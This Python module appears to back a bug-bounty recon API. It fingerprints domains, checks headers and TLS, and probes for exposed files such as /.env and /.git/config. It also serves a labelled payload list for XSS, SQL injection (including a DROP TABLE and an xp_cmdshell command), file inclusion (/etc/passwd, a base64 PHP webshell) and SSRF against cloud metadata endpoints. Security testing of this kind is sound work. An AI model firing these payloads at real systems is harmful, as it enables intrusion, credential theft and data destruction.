"""
services/recon.py
All logic: recon, url analysis, bug bounty scan, payloads, workflow, chat_assist.
Pure functions — no FastAPI imports.
"""

import socket
import urllib.request
import urllib.parse
import urllib.error
import ssl
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional
from datetime import datetime


# ── In-memory cache ────────────────────────────────────────────────────────────

_cache: dict = {}

def set_last_scan(key: str, data: dict):
    _cache["last"] = {"key": key, "data": data, "timestamp": datetime.utcnow().isoformat() + "Z"}

def get_last_scan() -> dict:
    return _cache.get("last", {})


# ── Constants ──────────────────────────────────────────────────────────────────

SECURITY_HEADERS = [
    "strict-transport-security",
    "content-security-policy",
    "x-frame-options",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
    "x-xss-protection",
]

TECH_HEADERS = {
    "server":            "Web server",
    "x-powered-by":      "Backend language/framework",
    "x-aspnet-version":  "ASP.NET version exposed",
    "x-generator":       "CMS/generator",
    "via":               "Proxy/CDN",
    "cf-ray":            "Cloudflare CDN",
    "x-vercel-id":       "Vercel",
    "x-amz-request-id":  "AWS",
    "x-cache":           "Caching layer",
    "x-shopify-stage":   "Shopify",
    "x-drupal-cache":    "Drupal CMS",
    "x-wp-total":        "WordPress",
}

COMMON_PATHS = [
    "/admin", "/admin/login", "/administrator",
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/login", "/signin", "/auth", "/oauth",
    "/backup", "/backup.zip", "/db.sql", "/dump.sql",
    "/.env", "/.env.local", "/.env.backup",
    "/.git/config", "/.git/HEAD",
    "/config.php", "/config.json", "/config.yml",
    "/robots.txt", "/sitemap.xml",
    "/swagger", "/swagger-ui", "/openapi.json", "/api/docs",
    "/phpmyadmin", "/wp-admin", "/wp-login.php", "/xmlrpc.php",
    "/debug", "/status", "/health", "/metrics", "/actuator",
    "/console", "/shell", "/eval",
    "/graphql", "/graphiql",
    "/.well-known/security.txt",
]

PAYLOADS = {
    "xss": [
        {"payload": "<script>alert(1)</script>",                           "label": "basic script tag"},
        {"payload": "<img src=x onerror=alert(1)>",                        "label": "img onerror"},
        {"payload": "'\"><script>alert(document.domain)</script>",         "label": "attr breakout"},
        {"payload": "<svg/onload=alert(1)>",                               "label": "svg onload"},
        {"payload": "javascript:alert(1)",                                 "label": "js protocol"},
        {"payload": "<details open ontoggle=alert(1)>",                   "label": "details ontoggle"},
        {"payload": "\"><img src=1 onerror=alert(1)>",                     "label": "quote breakout"},
        {"payload": "<iframe src=javascript:alert(1)>",                    "label": "iframe js"},
        {"payload": "'-alert(1)-'",                                        "label": "js string escape"},
        {"payload": "<body onload=alert(1)>",                              "label": "body onload"},
    ],
    "sqli": [
        {"payload": "' OR '1'='1",                                         "label": "basic auth bypass"},
        {"payload": "' OR 1=1 --",                                         "label": "comment bypass"},
        {"payload": "admin'--",                                            "label": "admin comment"},
        {"payload": "' UNION SELECT NULL--",                               "label": "union 1col"},
        {"payload": "' UNION SELECT NULL,NULL--",                          "label": "union 2col"},
        {"payload": "' AND SLEEP(5)--",                                    "label": "time-based blind"},
        {"payload": "' AND 1=2 UNION SELECT table_name FROM information_schema.tables--", "label": "schema dump"},
        {"payload": "1; DROP TABLE users--",                               "label": "destructive"},
        {"payload": "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",          "label": "nested sleep"},
        {"payload": "'; EXEC xp_cmdshell('whoami')--",                     "label": "mssql rce"},
    ],
    "lfi": [
        {"payload": "../../../etc/passwd",                                 "label": "basic traversal"},
        {"payload": "....//....//etc/passwd",                              "label": "filter bypass"},
        {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",                      "label": "url encoded"},
        {"payload": "..%252f..%252fetc%252fpasswd",                        "label": "double encoded"},
        {"payload": "/proc/self/environ",                                  "label": "proc environ"},
        {"payload": "/etc/passwd",                                         "label": "absolute path"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "label": "php wrapper"},
        {"payload": "php://input",                                         "label": "php input stream"},
        {"payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7", "label": "data wrapper rce"},
        {"payload": "/var/log/apache2/access.log",                         "label": "log poisoning"},
    ],
    "ssrf": [
        {"payload": "http://127.0.0.1/",                                   "label": "localhost"},
        {"payload": "http://localhost/",                                   "label": "localhost dns"},
        {"payload": "http://169.254.169.254/latest/meta-data/",            "label": "aws imds"},
        {"payload": "http://metadata.google.internal/computeMetadata/v1/", "label": "gcp metadata"},
        {"payload": "http://100.100.100.200/latest/meta-data/",            "label": "alibaba cloud"},
        {"payload": "http://[::1]/",                                       "label": "ipv6 localhost"},
        {"payload": "http://0.0.0.0/",                                     "label": "zero addr"},
        {"payload": "http://2130706433/",                                  "label": "decimal ip"},
        {"payload": "http://0177.0.0.1/",                                  "label": "octal ip"},
        {"payload": "dict://127.0.0.1:6379/info",                         "label": "redis via dict"},
    ],
}


# ── Helpers ────────────────────────────────────────────────────────────────────

def _make_request(url, timeout=5):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "CyberTools-API/1.0"})
    try:
        res = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return res, None
    except urllib.error.HTTPError as e:
        return e, None
    except Exception as e:
        return None, str(e)

def _headers_dict(response):
    return dict(response.headers)

def _missing_security_headers(headers):
    lower = {k.lower() for k in headers}
    return [h for h in SECURITY_HEADERS if h not in lower]

def _tech_hints(headers):
    hints = []
    lower_headers = {k.lower(): v for k, v in headers.items()}
    for header, label in TECH_HEADERS.items():
        if header in lower_headers:
            hints.append(f"{label}: {lower_headers[header]}")
    return hints

def _ssl_info(domain):
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((domain, 443), timeout=4), server_hostname=domain) as s:
            cert = s.getpeercert()
        expire_str = cert.get("notAfter", "")
        expire_dt = datetime.strptime(expire_str, "%b %d %H:%M:%S %Y %Z") if expire_str else None
        days_left = (expire_dt - datetime.utcnow()).days if expire_dt else None
        issuer = dict(x[0] for x in cert.get("issuer", []))
        subject = dict(x[0] for x in cert.get("subject", []))
        return {
            "valid": True,
            "expires": expire_str,
            "days_remaining": days_left,
            "issuer": issuer.get("organizationName", "unknown"),
            "subject": subject.get("commonName", domain),
            "warning": "Certificate expires soon!" if days_left and days_left < 30 else None,
        }
    except ssl.SSLCertVerificationError:
        return {"valid": False, "error": "SSL certificate verification failed."}
    except Exception as e:
        return {"valid": None, "error": str(e)}

def _probe_path(base, path):
    target = base + path
    res, err = _make_request(target, timeout=4)
    if res is not None:
        code = res.status if hasattr(res, "status") else res.code
        return {"path": path, "status": code}
    return {"path": path, "status": "error"}


# ── Recon ──────────────────────────────────────────────────────────────────────

def recon_domain(domain):
    domain = domain.strip().removeprefix("https://").removeprefix("http://").split("/")[0]

    try:
        ip = socket.gethostbyname(domain)
    except socket.gaierror as e:
        return {"error": f"DNS resolution failed: {e}"}

    res, err = _make_request(f"https://{domain}")
    protocol = "https"
    if res is None:
        res, err = _make_request(f"http://{domain}")
        protocol = "http"

    status_code = None
    headers = {}
    if res is not None:
        status_code = res.status if hasattr(res, "status") else res.code
        headers = _headers_dict(res)

    ssl_info = _ssl_info(domain) if protocol == "https" else {"valid": False, "error": "No HTTPS"}
    lower_h = {k.lower(): v for k, v in headers.items()}
    missing_sec = _missing_security_headers(headers)
    tech = _tech_hints(headers)

    summary = []
    if status_code:
        summary.append(f"Host reachable via {protocol.upper()} — HTTP {status_code}.")
    else:
        summary.append(f"Host unreachable. Error: {err}")

    if ssl_info.get("valid"):
        d = ssl_info.get("days_remaining")
        summary.append(f"SSL valid — expires in {d} days.")
        if d and d < 30:
            summary.append("Certificate expiring soon — check renewal.")
    elif ssl_info.get("valid") is False:
        summary.append(f"SSL issue: {ssl_info.get('error')}")

    if missing_sec:
        summary.append(f"Missing {len(missing_sec)} security header(s): {', '.join(missing_sec)}.")
    else:
        summary.append("All major security headers present.")

    if tech:
        summary.append(f"Stack detected: {'; '.join(tech)}.")

    if lower_h.get("access-control-allow-origin") == "*":
        summary.append("CORS wildcard (*) — any origin can read responses.")

    next_steps = []
    if "content-security-policy" not in lower_h:
        next_steps.append("No CSP — test for XSS in all input fields and URL params.")
    if "x-frame-options" not in lower_h:
        next_steps.append("No X-Frame-Options — try a clickjacking PoC in an iframe.")
    if any("wordpress" in t.lower() or "wp-" in t.lower() for t in tech):
        next_steps.append("WordPress detected — check /wp-login.php, xmlrpc.php, plugin CVEs.")
    if any("php" in t.lower() for t in tech):
        next_steps.append("PHP detected — test LFI payloads in file path parameters.")
    if any("server" in t.lower() for t in tech):
        next_steps.append("Server version exposed — check CVEs for that specific version.")
    next_steps.append(f"Run /bb-scan?url=https://{domain} to probe sensitive paths.")
    next_steps.append("Run /analyze-url to inspect redirects and header misconfigs.")
    next_steps.append("Test IDOR by incrementing numeric IDs in API paths.")

    result = {
        "domain": domain,
        "ip": ip,
        "protocol": protocol,
        "status_code": status_code,
        "ssl": ssl_info,
        "headers": headers,
        "missing_security_headers": missing_sec,
        "tech_hints": tech,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    set_last_scan(domain, result)
    return result


# ── URL Analyzer ───────────────────────────────────────────────────────────────

def analyze_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    redirect_chain = []
    current = url
    for _ in range(8):
        res, err = _make_request(current)
        if res is None:
            break
        code = res.status if hasattr(res, "status") else res.code
        redirect_chain.append({"url": current, "status": code})
        location = res.headers.get("Location") or res.headers.get("location")
        if location and code in (301, 302, 303, 307, 308):
            current = location if location.startswith("http") else urllib.parse.urljoin(current, location)
        else:
            break

    final_res, _ = _make_request(current)
    final_headers = _headers_dict(final_res) if final_res else {}
    final_status = (final_res.status if hasattr(final_res, "status") else final_res.code) if final_res else None
    lower_h = {k.lower(): v for k, v in final_headers.items()}
    missing_sec = _missing_security_headers(final_headers)

    misconfig_hints = []
    if "strict-transport-security" not in lower_h:
        misconfig_hints.append("HSTS missing — HTTP downgrade possible.")
    if "x-frame-options" not in lower_h:
        misconfig_hints.append("Clickjacking risk — X-Frame-Options not set.")
    if "x-content-type-options" not in lower_h:
        misconfig_hints.append("MIME-sniffing risk — X-Content-Type-Options missing.")
    if lower_h.get("access-control-allow-origin") == "*":
        misconfig_hints.append("CORS wildcard (*) — any origin can read responses.")
    if "x-powered-by" in lower_h:
        misconfig_hints.append(f"Stack exposed via X-Powered-By: {lower_h['x-powered-by']}")
    if "server" in lower_h:
        misconfig_hints.append(f"Server banner exposed: {lower_h['server']}")

    next_steps = []
    if misconfig_hints:
        next_steps.append("Fix misconfigurations above — low-effort wins for attackers.")
    if len(redirect_chain) > 2:
        next_steps.append("Long redirect chain — check if any hop uses HTTP (MITM risk).")
    next_steps.append("Verify final URL matches expected destination — check for open redirect.")

    summary = []
    if len(redirect_chain) > 1:
        summary.append(f"Redirects {len(redirect_chain)-1}x — lands at {current}.")
    summary.append(f"Final status: HTTP {final_status}.")
    if misconfig_hints:
        summary.append(f"{len(misconfig_hints)} misconfiguration(s) detected.")

    result = {
        "original_url": url,
        "final_url": current,
        "final_status": final_status,
        "redirect_chain": redirect_chain,
        "final_headers": final_headers,
        "missing_security_headers": missing_sec,
        "misconfig_hints": misconfig_hints,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    set_last_scan(url, result)
    return result


# ── Bug Bounty Scanner (threaded) ──────────────────────────────────────────────

def bb_scan(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    base = url.rstrip("/")
    probed = []
    found_paths = []

    with ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(_probe_path, base, path): path for path in COMMON_PATHS}
        for future in as_completed(futures):
            result = future.result()
            probed.append(result)
            if result["status"] not in (404, "error"):
                found_paths.append(result)

    found_paths.sort(key=lambda x: x["path"])
    probed.sort(key=lambda x: x["path"])

    hints = [
        "Fuzz params with SQLi/XSS — use /payloads endpoint.",
        "/robots.txt lists hidden paths — read it.",
        "Test inputs for reflected XSS.",
        "IDOR — change numeric IDs in API paths.",
        "Check if API returns data without auth (BOLA/IDOR).",
        "Test file uploads for unrestricted type vulnerabilities.",
        "Does CORS reflect arbitrary Origin headers?",
        "Test rate limiting on /login and /auth.",
        "403 on /admin still confirms existence — try bypasses.",
        "HTTP verb tampering on endpoints (PUT/DELETE/PATCH).",
        "/.git/HEAD accessible? Source code may be recoverable.",
        "/graphql found? Test introspection and batch queries.",
    ]

    next_steps = []
    for p in found_paths[:5]:
        s = p["status"]
        path = p["path"]
        if s == 200:
            next_steps.append(f"{path} → 200: inspect content and parameters manually.")
        elif s in (301, 302):
            next_steps.append(f"{path} → {s}: follow redirect, check destination.")
        elif s == 403:
            next_steps.append(f"{path} → 403: try X-Forwarded-For bypass, double slash, path normalization.")
        elif s == 500:
            next_steps.append(f"{path} → 500: error leak — inspect response body.")
    next_steps.append("Use /payloads?type=sqli for forms found during this scan.")

    summary = []
    if found_paths:
        summary.append(f"{len(found_paths)} interesting path(s) found (non-404):")
        for p in found_paths[:6]:
            summary.append(f"  {p['path']} → HTTP {p['status']}")
    else:
        summary.append("No exposed paths found. Try a deeper wordlist with ffuf or gobuster.")
    summary.append(f"Probed {len(probed)} paths total.")

    result = {
        "target": url,
        "paths_probed": len(probed),
        "interesting_paths": found_paths,
        "all_results": probed,
        "bug_bounty_hints": hints,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    set_last_scan(url, result)
    return result


# ── Payload Generator ──────────────────────────────────────────────────────────

def get_payloads(ptype):
    ptype = ptype.lower().strip()
    if ptype not in PAYLOADS:
        return {"error": f"Unknown type '{ptype}'. Choose from: {list(PAYLOADS.keys())}", "available": list(PAYLOADS.keys())}

    descriptions = {
        "xss":  "Cross-Site Scripting — inject into inputs, URL params, headers.",
        "sqli": "SQL Injection — inject into login forms, search, ID params.",
        "lfi":  "Local File Inclusion — inject into file path parameters.",
        "ssrf": "Server-Side Request Forgery — inject into URL/webhook/callback fields.",
    }
    usage_tips = {
        "xss":  ["Test in ?q=PAYLOAD", "Try in form inputs", "Test in Referer/User-Agent if reflected"],
        "sqli": ["Try in login fields", "Add to ?id=1PAYLOAD", "Use SLEEP() to confirm blind SQLi"],
        "lfi":  ["Replace ?page=PAYLOAD", "Combine with PHP wrappers on PHP sites", "Try /proc/self/environ for log poisoning RCE"],
        "ssrf": ["Inject into URL/callback/webhook fields", "Test cloud metadata endpoints", "Try dict:// and file:// schemes"],
    }
    items = PAYLOADS[ptype]
    return {
        "type": ptype,
        "description": descriptions[ptype],
        "count": len(items),
        "payloads": items,
        "usage_tips": usage_tips[ptype],
        "smart_summary": [
            f"{len(items)} {ptype.upper()} payloads ready.",
            descriptions[ptype],
            f"Start with: {usage_tips[ptype][0]}",
        ],
    }


# ── Workflow ───────────────────────────────────────────────────────────────────

def run_workflow(target):
    url = target if target.startswith(("http://", "https://")) else f"https://{target}"
    domain = target.strip().removeprefix("https://").removeprefix("http://").split("/")[0]

    t0 = time.time()

    with ThreadPoolExecutor(max_workers=2) as pool:
        f_recon   = pool.submit(recon_domain, domain)
        f_analyze = pool.submit(analyze_url, url)

    recon_data   = f_recon.result()
    analyze_data = f_analyze.result()
    scan_data    = bb_scan(url)

    elapsed = round(time.time() - t0, 2)

    all_next = list(dict.fromkeys(
        recon_data.get("next_steps", []) +
        analyze_data.get("next_steps", []) +
        scan_data.get("next_steps", [])
    ))

    result = {
        "target": target,
        "elapsed_seconds": elapsed,
        "recon": recon_data,
        "analysis": analyze_data,
        "bb_scan": scan_data,
        "next_steps": all_next,
        "smart_summary": (
            recon_data.get("smart_summary", []) +
            [f"Misconfig: {h}" for h in analyze_data.get("misconfig_hints", [])[:3]] +
            scan_data.get("smart_summary", [])
        ),
    }
    set_last_scan(target, result)
    return result


# ── Chat Assist (rule-based) ───────────────────────────────────────────────────

def chat_assist(question, scan_result=None):
    q = question.lower().strip()
    response = []
    sources = []

    ctx = scan_result or get_last_scan().get("data", {})

    if any(w in q for w in ["test", "what should", "next step", "start", "begin", "do next"]):
        steps = ctx.get("next_steps") or ctx.get("recon", {}).get("next_steps", [])
        if steps:
            response = steps
            sources.append("next_steps from last scan")
        else:
            response = [
                "Run /recon?domain=<target> first.",
                "Then /bb-scan?url=<target> to find exposed paths.",
                "Grab payloads from /payloads?type=xss and test all inputs.",
                "Check for IDOR by incrementing numeric IDs in API paths.",
            ]

    elif any(w in q for w in ["vulnerable", "vuln", "risk", "issue", "problem"]):
        summary = ctx.get("smart_summary") or ctx.get("recon", {}).get("smart_summary", [])
        hints = ctx.get("misconfig_hints") or ctx.get("analysis", {}).get("misconfig_hints", [])
        missing = ctx.get("missing_security_headers") or ctx.get("recon", {}).get("missing_security_headers", [])
        if summary: response += summary; sources.append("smart_summary")
        if hints: response += hints; sources.append("misconfig_hints")
        if missing: response.append(f"Missing headers: {', '.join(missing)}")
        if not response: response = ["No scan data found. Run /recon or /workflow first."]

    elif any(w in q for w in ["header", "hsts", "csp", "cors", "x-frame"]):
        missing = ctx.get("missing_security_headers") or ctx.get("recon", {}).get("missing_security_headers", [])
        if missing:
            response = [f"Missing: {h}" for h in missing]
            response.append("These headers prevent XSS, clickjacking, and MITM attacks.")
        else:
            response = ["No missing headers in last scan, or no scan data available."]

    elif any(w in q for w in ["payload", "xss", "sqli", "sql", "lfi", "ssrf"]):
        ptype = next((w for w in ["xss", "sqli", "lfi", "ssrf"] if w in q), "xss")
        tips = {
            "xss":  "Test in URL params, form inputs, and reflected headers.",
            "sqli": "Try in login fields and search. Use SLEEP() to confirm blind SQLi.",
            "lfi":  "Replace file path params. Try PHP wrappers on PHP sites.",
            "ssrf": "Inject into URL/webhook/callback fields. Test cloud metadata endpoints.",
        }
        response = [f"Use /payloads?type={ptype} to get categorized payloads.", tips.get(ptype, "")]

    elif any(w in q for w in ["ssl", "cert", "certificate", "https", "tls"]):
        ssl_data = ctx.get("ssl") or ctx.get("recon", {}).get("ssl", {})
        if ssl_data and ssl_data.get("valid"):
            response.append(f"SSL valid. Expires: {ssl_data.get('expires')} ({ssl_data.get('days_remaining')} days left).")
            if ssl_data.get("warning"): response.append(ssl_data["warning"])
        elif ssl_data:
            response.append(f"SSL issue: {ssl_data.get('error')}")
        else:
            response = ["No SSL data. Run /recon?domain=<target> first."]

    elif any(w in q for w in ["ip", "server", "tech", "stack", "technology"]):
        recon = ctx if "ip" in ctx else ctx.get("recon", {})
        if recon.get("ip"): response.append(f"IP: {recon['ip']}")
        if recon.get("tech_hints"): response += recon["tech_hints"]
        if not response: response = ["No recon data. Run /recon?domain=<target> first."]

    else:
        response = [
            "I can help with: test suggestions, vulnerabilities, headers, payloads, SSL, IP/tech.",
            "Try: 'What should I test?', 'What headers are missing?', 'Is this vulnerable?'",
        ]

    return {
        "question": question,
        "response": response,
        "sources": sources,
        "tip": "Run /workflow?target=<domain> for a full scan, then ask me anything.",
    }